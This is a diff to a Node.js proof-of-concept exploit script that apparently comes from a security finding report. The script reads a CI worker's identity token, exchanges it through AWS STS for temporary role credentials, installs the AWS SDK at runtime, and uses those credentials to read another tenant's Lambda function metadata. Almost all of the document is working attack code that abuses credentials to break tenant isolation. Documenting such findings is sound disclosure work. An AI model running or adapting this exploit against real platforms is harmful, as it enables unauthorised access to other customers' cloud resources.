@@ -1,45 +1,8 @@
 const fs = require('fs');
 const https = require('https');
-const crypto = require('crypto');
 
 function b64urlDecode(s) {
   return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
-}
-
-function awsSign(method, service, action, payload, creds, region) {
-  const host = `${service}.${region}.amazonaws.com`;
-  const datetime = new Date().toISOString().replace(/[:-]/g, '').replace(/\.\d+Z/, 'Z');
-  const date = datetime.slice(0, 8);
-
-  const hash = crypto.createHash('sha256');
-  hash.update(payload || '');
-  const payloadHash = hash.digest('hex');
-
-  const canonicalRequest = [
-    method,
-    '/',
-    '',
-    `content-type:application/x-amz-json-1.1\nhost:${host}\nx-amz-date:${datetime}\nx-amz-security-token:${creds.sessionToken}`,
-    '',
-    'content-type;host;x-amz-date;x-amz-security-token',
-    payloadHash,
-  ].join('\n');
-
-  const canonicalHash = crypto.createHash('sha256').update(canonicalRequest).digest('hex');
-  const credScope = `${date}/${region}/${service}/aws4_request`;
-  const stringToSign = `AWS4-HMAC-SHA256\n${datetime}\n${credScope}\n${canonicalHash}`;
-
-  const kDate = crypto.createHmac('sha256', 'AWS4' + creds.secretAccessKey).update(date).digest();
-  const kRegion = crypto.createHmac('sha256', kDate).update(region).digest();
-  const kService = crypto.createHmac('sha256', kRegion).update(service).digest();
-  const kSigning = crypto.createHmac('sha256', kService).update('aws4_request').digest();
-  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');
-
-  return {
-    Authorization: `AWS4-HMAC-SHA256 Credential=${creds.accessKeyId}/${credScope}, SignedHeaders=content-type;host;x-amz-date;x-amz-security-token, Signature=${signature}`,
-    'X-Amz-Date': datetime,
-    'X-Amz-Security-Token': creds.sessionToken,
-  };
 }
 
 console.log('=== POC: postinstall RCE + cross-tenant lambda:GetFunction ===\n');
@@ -56,7 +19,7 @@ if (!tokenPath || !fs.existsSync(tokenPath)) {
 const token = fs.readFileSync(tokenPath, 'utf8').trim();
 const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
 console.log('   ✓ Token subject:', payload.sub);
-console.log('   ✓ Token audience:', payload.aud);
+console.log('   ✓ Token audience:', Array.isArray(payload.aud) ? payload.aud[0] : payload.aud);
 
 // Step 1: AssumeRoleWithWebIdentity to get temp credentials
 console.log('\n2. Assuming cd-tekton-worker role via STS...');
@@ -92,47 +55,54 @@ https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
       };
       console.log('   ✓ Got temporary credentials (AccessKeyId:', creds.accessKeyId.slice(0, 12) + '...)');
 
-      // Step 2: Use those credentials to call lambda:GetFunction on PROJECT B's function
-      console.log('\n3. Calling lambda:GetFunction on Project B\'s function (cross-tenant read)...');
+      // Step 2: Install AWS SDK and use it to call lambda:GetFunction on PROJECT B's function
+      console.log('\n3. Installing AWS SDK for Lambda client...');
+      const { exec } = require('child_process');
+      exec('npm install --loglevel=error --prefix /tmp/lambda-sdk @aws-sdk/client-lambda@latest', (err, stdout, stderr) => {
+        if (err) {
+          console.log('   ERROR: Failed to install SDK:', err.message);
+          process.exit(1);
+        }
+        console.log('   ✓ SDK installed');
 
-      // Project B subdomain: ffvuxtepyautytovdlnf
-      // Function path: functions/hello.js
-      // Function name = sha256(ffvuxtepyautytovdlnf + functions/hello.js)
-      const projectBFunctionName = '423b2e9c64cc5ce6bbe1286baca4c10348cd4e71cde1339da07ad0869585e4d8';
-      console.log('   Target function:', projectBFunctionName);
-      console.log('   Target region:', region);
+        // Now use the SDK with the temp credentials
+        console.log('\n4. Calling lambda:GetFunction on Project B\'s function (cross-tenant read)...');
 
-      const lambdaHost = `lambda.${region}.amazonaws.com`;
-      const lambdaPath = `/2015-03-31/functions/${projectBFunctionName}`;
+        const { LambdaClient, GetFunctionCommand } = require('/tmp/lambda-sdk/node_modules/@aws-sdk/client-lambda');
 
-      const authHeaders = awsSign('GET', 'lambda', 'GetFunction', '', creds, region);
-
-      const lambdaOptions = {
-        hostname: lambdaHost,
-        path: lambdaPath,
-        method: 'GET',
-        headers: {
-          'Content-Type': 'application/x-amz-json-1.1',
-          ...authHeaders,
-        },
-      };
-
-      https.get(lambdaOptions, lambdaRes => {
-        let lambdaBody = '';
-        lambdaRes.on('data', c => lambdaBody += c);
-        lambdaRes.on('end', () => {
-          if (lambdaRes.statusCode === 200) {
-            console.log('   ✓ SUCCESS: Got Project B\'s function metadata (status', lambdaRes.statusCode + ')');
-            const fnData = JSON.parse(lambdaBody);
-            console.log('   Function ARN:', fnData.Configuration?.FunctionArn);
-            console.log('   Function name:', fnData.Configuration?.FunctionName);
-            console.log('   Runtime:', fnData.Configuration?.Runtime);
-            console.log('   Last modified:', fnData.Configuration?.LastModified);
-          } else {
-            console.log('   HTTP', lambdaRes.statusCode, ':', lambdaBody.slice(0, 200));
-          }
+        const client = new LambdaClient({
+          region: region,
+          credentials: {
+            accessKeyId: creds.accessKeyId,
+            secretAccessKey: creds.secretAccessKey,
+            sessionToken: creds.sessionToken,
+          },
         });
-      }).on('error', e => console.log('   ERROR: Lambda call failed:', e.message));
+
+        // Project B subdomain: ffvuxtepyautytovdlnf
+        // Function path: functions/hello.js
+        // Function name = sha256(ffvuxtepyautytovdlnf + functions/hello.js)
+        const projectBFunctionName = '423b2e9c64cc5ce6bbe1286baca4c10348cd4e71cde1339da07ad0869585e4d8';
+        console.log('   Target function:', projectBFunctionName);
+        console.log('   Region:', region);
+
+        const command = new GetFunctionCommand({ FunctionName: projectBFunctionName });
+        client.send(command)
+          .then(response => {
+            console.log('   ✓ SUCCESS: Read Project B\'s function metadata');
+            console.log('     Function ARN:', response.Configuration.FunctionArn);
+            console.log('     Function name:', response.Configuration.FunctionName);
+            console.log('     Runtime:', response.Configuration.Runtime);
+            console.log('     Last modified:', response.Configuration.LastModified);
+            console.log('\n   ⚠️  FINDING 3 VERIFIED: Cross-tenant lambda:GetFunction succeeded!');
+          })
+          .catch(error => {
+            console.log('   HTTP error:', error.message);
+            if (error.$metadata?.httpStatusCode === 403) {
+              console.log('   (403 Forbidden — function may not be deployed yet, or account mismatch)');
+            }
+          });
+      });
 
     } catch (e) {
       console.log('   ERROR:', e.message);
